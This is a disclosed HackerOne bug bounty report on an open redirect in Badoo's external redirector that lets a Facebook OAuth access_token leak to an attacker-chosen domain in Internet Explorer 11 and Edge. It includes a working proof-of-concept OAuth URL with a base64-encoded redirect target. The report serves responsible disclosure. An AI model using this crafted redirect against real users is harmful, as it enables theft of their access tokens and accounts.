# Open redirect helps to steal Facebook access_token

## Report Details
- **Report ID**: 99435
- **URL**: https://hackerone.com/reports/99435
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-11-13T07:41:23.129Z
- **Disclosed**: 2017-08-31T10:23:49.717Z

## Reporter
- **Username**: stefanovettorazzi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: bumble

## Vulnerability Information
__Description__

https://badoo.com/external/redirector.phtml is the endpoint used when authenticating using external services. This endpoint accepts the parameter _state_ which is a base64 encoded URL. The URL can't be like http://google.com/, but it can be like http://google.com%2f.badoo.com/ which is a valid URL for Internet Explorer (11 and Edge).
The problem is that Facebook redirects to the value of _redirect_uri_ even if the URL contains parameters (like `?parameter=value`), which is not the case with Google. So, for instance you can send the _access_token_ returned from Facebook to any domain that you control.

__Proof of concept__

1. Using a user that already linked the account with Facebook, go to https://www.facebook.com/v2.2/dialog/oauth?response_type=token&display=popup&client_id=107433747809&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3fstate%3daHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyZi5iYWRvby5jb20v
2. You are redirected to https://www.google.com/.badoo.com/#access_token=[user_access_token]&expires_in=[number].

This issue is only reproducible on Internet Explorer 11 and Edge. I tested on both using a Windows 10 installation with latest updates.
I hope the explanation is clear. Please, let me know if you need more information or a better proof of concept.

## Attachments
No attachments
